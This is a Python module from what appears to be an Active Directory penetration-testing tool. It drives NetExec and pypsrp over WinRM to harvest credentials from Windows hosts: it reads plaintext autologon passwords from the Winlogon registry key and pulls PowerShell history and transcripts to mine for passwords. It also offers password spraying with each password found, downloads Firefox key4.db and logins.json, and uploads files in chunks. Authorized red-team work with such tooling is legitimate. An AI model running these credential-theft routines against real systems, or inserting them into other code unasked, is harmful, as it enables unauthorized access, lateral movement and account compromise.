"""WinRM CLI orchestration helpers.

This module extracts WinRM-related orchestration logic out of the monolithic
`adscan.py` so it can be reused by future UX layers while keeping runtime
behaviour stable for the current CLI.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
from pathlib import Path
from typing import Any, Iterable

from rich.prompt import Confirm

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_operation_header,
    print_success,
    print_warning,
    print_warning_verbose,
    telemetry,
)
from adscan_internal.rich_output import create_progress_simple, mark_sensitive
from adscan_internal.text_utils import strip_ansi_codes


def ask_for_winrm_access(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Ask to enumerate a host via WinRM and run the follow-up checks."""
    from rich.prompt import Confirm

    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    answer = Confirm.ask(
        f"Do you want to enumerate host {marked_host} via WinRM as user {marked_username}?"
    )
    if answer:
        shell.do_check_firefox_credentials(domain, host, username, password)
        shell.do_show_powershell_history(domain, host, username, password)
        shell.do_check_powershell_transcripts(domain, host, username, password)
        shell.do_check_autologon(domain, host, username, password)


def netexec_extract_winrm(shell: Any, *, domain: str) -> None:
    """Extract WinRM hosts from a generic list using NetExec output."""
    marked_domain = mark_sensitive(domain, "domain")
    command = f"{shell.netexec_path} winrm winrm/ips.txt | grep {marked_domain}"
    shell.extract_services(command, domain, "winrm")


def check_autologon(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Check for autologon credentials on a host using NetExec over WinRM.

    This helper is the CLI-level extraction of the legacy
    ``PentestShell.do_check_autologon`` method in ``adscan.py`` so that WinRM
    autologon logic can be reused by other UX layers.
    """
    try:
        credential_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "Autologon Credential Check",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": credential_type,
                "Protocol": "WinRM",
                "Registry Key": r"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            },
            icon="🔑",
        )

        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)

        autologon_command = (
            f"""{shell.netexec_path} winrm {host} {auth} --log domains/{domain}/winrm/dump_{host}_autologon.txt """
            f"""-X 'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" | """
            f"""Select DefaultDomainName,DefaultUserName,DefaultPassword | fl'"""
        )
        print_info_debug(f"Command: {autologon_command}")
        completed_process = shell._run_netexec(  # type: ignore[attr-defined]
            autologon_command,
            domain=domain,
            timeout=300,
        )
        output = completed_process.stdout or ""
        errors_output = completed_process.stderr or ""

        if completed_process.returncode == 0:
            default_user_name: str | None = None
            default_password: str | None = None
            default_domain_name: str | None = None

            for line in output.splitlines():
                if "DefaultUserName" in line:
                    parts = line.split(":", 1)
                    if len(parts) > 1:
                        default_user_name = parts[1].strip()
                elif "DefaultPassword" in line:
                    parts = line.split(":", 1)
                    if len(parts) > 1:
                        default_password = parts[1].strip()
                elif "DefaultDomainName" in line:
                    parts = line.split(":", 1)
                    if len(parts) > 1:
                        default_domain_name = parts[1].strip()

            if default_user_name and default_password:
                if "\\" in default_user_name:
                    _, user_autologon = default_user_name.split("\\", 1)
                else:
                    user_autologon = default_user_name

                domain_autologon = (
                    default_domain_name if default_domain_name else ""
                )

                print_warning("Autologon credentials found:")
                shell.console.print(f"   Domain: {domain_autologon}")
                shell.console.print(f"   User: {user_autologon}")
                shell.console.print(f"   Password: {default_password}")

                shell.add_credential(domain, user_autologon, default_password)
            else:
                print_error("No autologon credentials found in the output.")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                "Error obtaining autologon credentials: "
                f"{error_message if error_message else 'Details not available'}"
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error accessing autologon credentials.")
        print_exception(show_locals=False, exception=exc)


def show_powershell_history(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Retrieve and process PowerShell history for a specific user via WinRM."""
    try:
        history_remote_path = (
            f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"
            "PowerShell\\PSReadLine\\ConsoleHost_history.txt"
        )

        marked_username = mark_sensitive(username, "user")
        print_info(f"Checking PowerShell history for user {marked_username}")

        download_dir = os.path.join(
            shell.domains_dir, domain, "winrm", host, "powershell_history"
        )
        downloaded_files = shell.winrm_download(
            domain,
            host,
            username,
            password,
            [history_remote_path],
            download_dir,
        )

        if not downloaded_files:
            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"No PowerShell history file found for user {marked_username} on host {marked_host}."
            )
            return

        history_local_path = downloaded_files[0]

        try:
            with open(
                history_local_path, "r", encoding="utf-8", errors="ignore"
            ) as handle:
                history_lines = [
                    line.rstrip("\r\n") for line in handle if line.strip()
                ]
        except OSError as file_err:
            telemetry.capture_exception(file_err)
            print_error(
                f"Error reading downloaded PowerShell history file: {file_err}"
            )
            return

        if not history_lines:
            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"PowerShell history file for user {marked_username} on host {marked_host} is empty."
            )
        else:
            import rich
            from rich.table import Table

            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_success(
                f"PowerShell history retrieved for user {marked_username} on host {marked_host}."
            )
            history_table = Table(
                title="PowerShell Command History",
                show_header=True,
                header_style="bold magenta",
                box=rich.box.ROUNDED,
                expand=False,
            )
            history_table.add_column("Command", style="white", overflow="fold")

            for cmd in history_lines:
                history_table.add_row(cmd)

            shell.console.print(history_table)

        credentials = shell.analyze_log_with_credsweeper(history_local_path)

        if not credentials:
            print_info_verbose(
                "No credentials detected in PowerShell history with CredSweeper."
            )
            return

        seen_passwords: set[str] = set()
        found_count = 0

        for _, entries in credentials.items():
            for value, ml_probability, context_line, line_num, file_path in entries:
                if not value:
                    continue
                password_value = value.strip()
                if not password_value or password_value in seen_passwords:
                    continue
                seen_passwords.add(password_value)
                found_count += 1

                confidence_display = (
                    f"{float(ml_probability):.2%}"
                    if isinstance(ml_probability, (int, float))
                    else "N/A"
                )
                marked_username = mark_sensitive(username, "user")
                marked_domain = mark_sensitive(domain, "domain")
                marked_host = mark_sensitive(host, "hostname")
                marked_file_path = mark_sensitive(file_path, "path")
                marked_password = mark_sensitive(password_value, "password")
                marked_suffix = mark_sensitive(
                    "..." if len(password_value) > 50 else "", "password"
                )
                print_info(
                    f"[PSHistory] Potential password for {marked_username}@{marked_domain} "
                    f"on {marked_host}: '{marked_password[:50]}{marked_suffix}' "
                    f"(confidence: {confidence_display}, line: {line_num}, file: {marked_file_path})"
                )

                answer = Confirm.ask(
                    "Would you like to perform a password spraying with this password?",
                    default=True,
                )
                if answer:
                    shell.spraying_with_password(domain, password_value)

        if found_count > 0:
            marked_username = mark_sensitive(username, "user")
            print_success(
                f"Added {found_count} potential credential(s) from PowerShell history for user {marked_username}."
            )
        else:
            print_info_verbose(
                "CredSweeper did not return any usable passwords from PowerShell history."
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error accessing PowerShell history.")
        print_exception(show_locals=False, exception=exc)


def check_powershell_transcripts(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Check and analyze PowerShell transcripts on a host via NetExec WinRM."""
    from adscan_internal.rich_output import mark_sensitive

    try:
        cred_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "PowerShell Transcript Analysis",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": cred_type,
                "Protocol": "WinRM",
                "Search Path": "Common transcript directories + C:\\pstrans*",
                "Target Files": "PowerShell_transcript*",
            },
            icon="📝",
        )

        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)

        transcript_search_log = os.path.join(
            "domains", domain, "winrm", f"{host}_pstranscripts_search.log"
        )
        search_script = (
            '$ErrorActionPreference="SilentlyContinue";'
            "$candidatePaths=@("
            '"C:\\\\PSTranscripts",'
            '"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcripts",'
            '"C\\\\ProgramData\\\\PowerShell\\\\Transcripts",'
            '"C:\\\\Users\\\\*\\\\Documents\\\\PowerShell\\\\Transcripts",'
            '"C:\\\\Users\\\\*\\\\Documents\\\\WindowsPowerShell\\\\Transcripts",'
            '"C:\\\\Users\\\\*\\\\Documents"'
            ");"
            "$paths=@();"
            "foreach($p in $candidatePaths){ if(Test-Path $p){ $paths+=$p } };"
            "$rootMatches=@();"
            'try { $rootMatches = Get-ChildItem -Path "C:\\" -Directory -Force -Filter "pstrans*" '
            "-ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName } catch { };"
            "if($rootMatches.Count -gt 0){ $paths += $rootMatches };"
            "if($paths.Count -eq 0){ exit 0 };"
            'Get-ChildItem -Path $paths -Filter "PowerShell_transcript*" '
            "-Recurse -Force -ErrorAction SilentlyContinue | "
            "ForEach-Object { $_.FullName }"
        )
        search_command = (
            f"""{shell.netexec_path} winrm {host} {auth} """
            f"""--log {transcript_search_log} -X '{search_script}'"""
        )

        print_info_debug(f"Command: {search_command}")

        search_proc = shell.run_command(search_command, timeout=300)
        search_output = strip_ansi_codes(search_proc.stdout or "")

        if search_proc.returncode != 0:
            error_message = strip_ansi_codes(
                (search_proc.stderr or search_output or "").strip()
            )
            marked_host = mark_sensitive(host, "hostname")
            print_error(
                f"Error searching for PowerShell transcripts on host {marked_host}: "
                f"{error_message or 'Details not available'}"
            )
            return

        transcript_paths: list[str] = []
        for line in search_output.splitlines():
            match = re.search(r"[A-Za-z]:\\[^\r\n]+", line)
            if match:
                transcript_paths.append(match.group(0).strip())

        if not transcript_paths:
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"No PowerShell transcript files found for host {marked_host} "
                "when searching common transcript directories."
            )
            return

        marked_host = mark_sensitive(host, "hostname")
        print_success(
            f"Found {len(transcript_paths)} PowerShell transcript file(s) on host {marked_host}."
        )
        if getattr(shell, "SECRET_MODE", False):
            print_info_debug(
                f"[PSTranscripts] Remote transcript paths: {transcript_paths}"
            )

        transcripts_download_dir = os.path.join(
            shell.domains_dir, domain, "winrm", host, "pstranscripts"
        )
        downloaded_files = shell.winrm_download(
            domain,
            host,
            username,
            password,
            transcript_paths,
            transcripts_download_dir,
        )

        if not downloaded_files:
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"Failed to download PowerShell transcript files from host {marked_host}."
            )
            return

        print_success(
            f"Downloaded {len(downloaded_files)} PowerShell transcript file(s) "
            f"to {transcripts_download_dir}"
        )

        total_found = 0
        seen_passwords: set[str] = set()

        for local_path in downloaded_files:
            credentials = shell.analyze_log_with_credsweeper(local_path)
            if not credentials:
                continue

            for _, entries in credentials.items():
                for (
                    value,
                    ml_probability,
                    context_line,
                    line_num,
                    file_path,
                ) in entries:
                    if not value:
                        continue
                    password_value = value.strip()
                    if not password_value or password_value in seen_passwords:
                        continue
                    seen_passwords.add(password_value)
                    total_found += 1

                    confidence_display = (
                        f"{float(ml_probability):.2%}"
                        if isinstance(ml_probability, (int, float))
                        else "N/A"
                    )
                    marked_username = mark_sensitive(username, "user")
                    marked_domain = mark_sensitive(domain, "domain")
                    marked_host = mark_sensitive(host, "hostname")
                    marked_file_path = mark_sensitive(file_path, "path")
                    marked_password = mark_sensitive(password_value, "password")
                    marked_suffix = mark_sensitive(
                        "..." if len(password_value) > 50 else "", "password"
                    )
                    print_info(
                        f"[PSTranscripts] Potential password for {marked_username}@{marked_domain} "
                        f"on {marked_host}: '{marked_password[:50]}{marked_suffix}' "
                        f"(confidence: {confidence_display}, line: {line_num}, file: {marked_file_path})"
                    )

                    answer = Confirm.ask(
                        "Would you like to perform a password spraying with this password?",
                        default=True,
                    )
                    if answer:
                        shell.spraying_with_password(domain, password_value)

        if total_found > 0:
            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_success(
                f"Added {total_found} potential credential(s) from PowerShell transcripts "
                f"for user {marked_username} on host {marked_host}."
            )
        else:
            print_info_verbose(
                "CredSweeper did not return any usable passwords from PowerShell transcripts."
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        marked_host = mark_sensitive(host, "hostname")
        print_error(
            f"Error checking or analyzing PowerShell transcripts on host {marked_host}: {str(exc)}"
        )


def winrm_download(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    paths: Iterable[str],
    download_dir: str,
) -> list[str]:
    """Download files from a target host using WinRM.

    Args:
        shell: Active `PentestShell` instance.
        domain: User's domain.
        host: Target host.
        username: WinRM-accessible username.
        password: Password or NTLM hash.
        paths: File paths to download.
        download_dir: Local directory to save files into.

    Returns:
        List of successfully downloaded local file paths.
    """
    try:
        os.makedirs(download_dir, exist_ok=True)
        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
        downloaded_files: list[str] = []

        for path in paths:
            file_name = path.split("\\")[-1]
            save_path = os.path.join(download_dir, file_name)

            download_command = (
                f"{shell.netexec_path} winrm {host} {auth} "
                f"--log {download_dir}/download_{file_name}.log "
                f'-X \'$content = Get-Content "{path}" -Raw -Encoding Byte; '
                "[Convert]::ToBase64String($content)'"
            )

            print_info_verbose(f"Downloading {file_name}")
            print_info_debug(f"via: {download_command}")
            proc = shell.run_command(download_command, timeout=300)

            if proc.returncode != 0:
                details = (
                    proc.stderr.strip() if proc.stderr else "Details not available"
                )
                print_error(f"Error downloading {file_name}: {details}")
                continue

            try:
                base64_match = re.search(r"([A-Za-z0-9+/]{40,}={0,2})", proc.stdout)
                if not base64_match:
                    print_warning_verbose(
                        f"No valid base64 content found for {file_name}"
                    )
                    continue

                cleaned_output = base64_match.group(1)
                while len(cleaned_output) % 4 != 0:
                    cleaned_output += "="

                file_content = base64.b64decode(cleaned_output)
                with open(save_path, "wb") as handle:
                    handle.write(file_content)
                print_success(f"File {file_name} saved in {download_dir}")
                downloaded_files.append(save_path)
            except Exception as exc:
                telemetry.capture_exception(exc)
                print_error(f"Error saving {file_name}.")
                print_exception(show_locals=False, exception=exc)

        return downloaded_files
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error downloading files.")
        print_exception(show_locals=False, exception=exc)
        return []


def winrm_upload(
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    local_path: str,
    remote_path: str,
) -> bool:
    """Upload a local file to a remote host over WinRM using pypsrp.

    This implementation is inspired by evil-winrm-py's chunked uploader.
    """
    try:
        from pypsrp.client import Client  # type: ignore[import]
        from pypsrp.complex_objects import PSInvocationState  # type: ignore[import]
        from pypsrp.powershell import PowerShell, RunspacePool  # type: ignore[import]
    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error(
            "pypsrp is not available; unable to perform WinRM upload. "
            "Install pypsrp or fall back to alternative upload methods."
        )
        return False

    if not os.path.exists(local_path) or not os.path.isfile(local_path):
        print_error(f"Local file '{local_path}' does not exist or is not a file.")
        return False

    if domain:
        full_username = f"{domain}\\{username}"
    else:
        full_username = username

    secret = password
    if secret and re.fullmatch(r"[0-9A-Fa-f]{32}", secret):
        secret = f"{'0' * 32}:{secret}"

    winrm_port = 5985
    use_ssl = False

    marked_host = mark_sensitive(host, "hostname")
    print_info_verbose(
        f"Uploading '{local_path}' to '{remote_path}' on {marked_host} via WinRM/pypsrp."
    )

    try:
        client = Client(
            host,
            username=full_username,
            password=secret,
            ssl=use_ssl,
            port=winrm_port,
            auth="ntlm",
        )
    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error(
            f"Failed to initialise WinRM client for upload to {marked_host}: {exc}"
        )
        return False

    file_path = Path(local_path)
    try:
        file_size = file_path.stat().st_size
    except OSError as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error(f"Unable to read local file size for '{local_path}'.")
        print_exception(show_locals=False, exception=exc)
        return False

    try:
        with file_path.open("rb") as handle:
            hexdigest = hashlib.md5(handle.read()).hexdigest().upper()
    except OSError as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error(f"Unable to hash local file '{local_path}'.")
        print_exception(show_locals=False, exception=exc)
        return False

    send_ps_script = r"""
param (
    [Parameter(Mandatory=$true, Position=0)]
    [string]$Base64Chunk,
    [Parameter(Mandatory=$true, Position=1)]
    [int]$ChunkType = 0,
    [Parameter(Mandatory=$false, Position=2)]
    [string]$TempFilePath,
    [Parameter(Mandatory=$false, Position=3)]
    [string]$FilePath,
    [Parameter(Mandatory=$false, Position=4)]
    [string]$FileHash
)

$fileStream = $null

if ($ChunkType -eq 0 -or $ChunkType -eq 3) {
    $TempFilePath = [System.IO.Path]::Combine(
        [System.IO.Path]::GetTempPath(),
        [System.IO.Path]::GetRandomFileName()
    )

    [PSCustomObject]@{
        Type         = "Metadata"
        TempFilePath = $TempFilePath
    } | ConvertTo-Json -Compress | Write-Output
}

try {
    $chunkBytes = [System.Convert]::FromBase64String($Base64Chunk)

    $fileStream = New-Object System.IO.FileStream(
        $TempFilePath,
        [System.IO.FileMode]::Append,
        [System.IO.FileAccess]::Write
    )

    $fileStream.Write($chunkBytes, 0, $chunkBytes.Length)
    $fileStream.Close()
} catch {
    $msg = "$($_.Exception.GetType().FullName): $($_.Exception.Message)"
    [PSCustomObject]@{
        Type    = "Error"
        Message = "Error processing chunk or writing to file: $msg"
    } | ConvertTo-Json -Compress | Write-Output
} finally {
    if ($fileStream) {
        $fileStream.Dispose()
    }
}

if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
    try {
        if ($TempFilePath) {
            $calculatedHash = (Get-FileHash -Path $TempFilePath -Algorithm MD5).Hash
            if ($calculatedHash -eq $FileHash) {
                [System.IO.File]::Delete($FilePath)
                [System.IO.File]::Move($TempFilePath, $FilePath)

                $fileInfo = Get-Item -Path $FilePath
                $fileSize = $fileInfo.Length
                $fileHash = (Get-FileHash -Path $FilePath -Algorithm MD5).Hash

                [PSCustomObject]@{
                    Type     = "Metadata"
                    FilePath = $FilePath
                    FileSize = $fileSize
                    FileHash = $fileHash
                    FileName = $fileInfo.Name
                } | ConvertTo-Json -Compress | Write-Output
            } else {
                [PSCustomObject]@{
                    Type    = "Error"
                    Message = "File hash mismatch. Expected: $FileHash, Calculated: $calculatedHash"
                } | ConvertTo-Json -Compress | Write-Output
            }
        } else {
            [PSCustomObject]@{
                Type    = "Error"
                Message = "File hash not provided for verification."
            } | ConvertTo-Json -Compress | Write-Output
        }
    } catch {
        $msg = "$($_.Exception.GetType().FullName): $($_.Exception.Message)"
        [PSCustomObject]@{
            Type    = "Error"
            Message = "Error processing chunk or writing to file: $msg"
        } | ConvertTo-Json -Compress | Write-Output
    }
}
"""

    chunk_size = 65536
    total_chunks = (file_size + chunk_size - 1) // chunk_size

    progress, task_id = create_progress_simple(
        total=file_size if file_size > 0 else 1,
        description=f"[cyan]Uploading {file_path.name} via WinRM...",
    )

    try:
        with RunspacePool(client.wsman) as pool:
            temp_file_path: str = ""
            metadata: dict | None = None

            with progress:
                with file_path.open("rb") as src:
                    for index in range(total_chunks):
                        chunk = src.read(chunk_size)
                        if not chunk:
                            break

                        if total_chunks == 1:
                            chunk_type = 3
                        elif index == 0:
                            chunk_type = 0
                        elif index == total_chunks - 1:
                            chunk_type = 1
                        else:
                            chunk_type = 2

                        base64_chunk = base64.b64encode(chunk).decode("utf-8")

                        ps = PowerShell(pool)
                        ps.add_script(send_ps_script)
                        ps.add_parameter("Base64Chunk", base64_chunk)
                        ps.add_parameter("ChunkType", chunk_type)

                        if chunk_type in (1, 2) and temp_file_path:
                            ps.add_parameter("TempFilePath", temp_file_path)

                        if chunk_type in (1, 3):
                            ps.add_parameter("FilePath", remote_path)
                            ps.add_parameter("FileHash", hexdigest)

                        ps.begin_invoke()
                        while ps.state == PSInvocationState.RUNNING:
                            ps.poll_invoke()

                        for line in ps.output:
                            try:
                                data = json.loads(str(line))
                            except Exception:
                                continue

                            if data.get("Type") == "Metadata":
                                metadata = data
                                if "TempFilePath" in data:
                                    temp_file_path = data["TempFilePath"]
                            elif data.get("Type") == "Error":
                                msg = data.get(
                                    "Message", "Unknown error during WinRM upload."
                                )
                                print_error(msg)
                                return False

                        if ps.had_errors and ps.streams.error:
                            first_err = ps.streams.error[0]
                            print_error(str(first_err))
                            return False

                        progress.update(task_id, advance=len(chunk))

            if metadata and metadata.get("FilePath") == remote_path:
                marked_remote = mark_sensitive(remote_path, "path")
                print_success(f"WinRM upload completed: {marked_remote}")
                return True

            print_warning(
                "WinRM upload finished but remote verification metadata is missing."
            )
            return True
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error(f"WinRM upload failed: {exc}")
        print_exception(show_locals=False, exception=exc)
        return False


def check_firefox_credentials(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Search for Firefox credential files on a host using NetExec over WinRM.

    This helper mirrors the legacy ``PentestShell.do_check_firefox_credentials``
    method in ``adscan.py`` so it can be reused by other UX layers.
    """
    try:
        from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_subpath

        cred_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "Firefox Credential Search",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": cred_type,
                "Protocol": "WinRM",
                "Search Path": f"C:\\Users\\{username}\\AppData",
                "Target Files": "key4.db, logins.json",
            },
            icon="🦊",
        )

        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)

        firefox_command = (
            f"""{shell.netexec_path} winrm {host} {auth} --log """
            f"""domains/{domain}/winrm/{host}_firefox_{username}.log -X """
            f"""'Get-ChildItem -Path "C:\\Users\\{username}\\AppData" """
            f"""-Include key4.db,logins.json -File -Recurse -ErrorAction SilentlyContinue """
            f"""| ForEach-Object {{ $_.FullName }}'"""
        )
        completed_process = shell.run_command(firefox_command, timeout=300)
        output = completed_process.stdout or ""

        if completed_process.returncode == 0 and (
            "key4.db" in output and "logins.json" in output
        ):
            marked_username = mark_sensitive(username, "user")
            print_warning(
                f"Firefox credential files found for user {marked_username}"
            )

            paths: list[str] = []
            for line in output.splitlines():
                if "key4.db" in line or "logins.json" in line:
                    pdc = shell.domains_data[domain]["pdc"]
                    path = line.split(pdc)[-1].strip()
                    paths.append(path)

            if not paths:
                print_error("No valid file paths found")
                return

            workspace_cwd = shell.current_workspace_dir or os.getcwd()
            download_dir = domain_subpath(
                workspace_cwd,
                shell.domains_dir,
                domain,
                DEFAULT_DOMAIN_LAYOUT.winrm,
                host,
            )
            downloaded_files = shell.winrm_download(
                domain, host, username, password, paths, download_dir
            )

            if downloaded_files:
                shell.extract_firefox_passwords(domain, host, download_dir)
        else:
            marked_username = mark_sensitive(username, "user")
            print_error(
                f"No Firefox credential files found for user {marked_username}"
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error searching for Firefox credentials.")
        print_exception(show_locals=False, exception=exc)
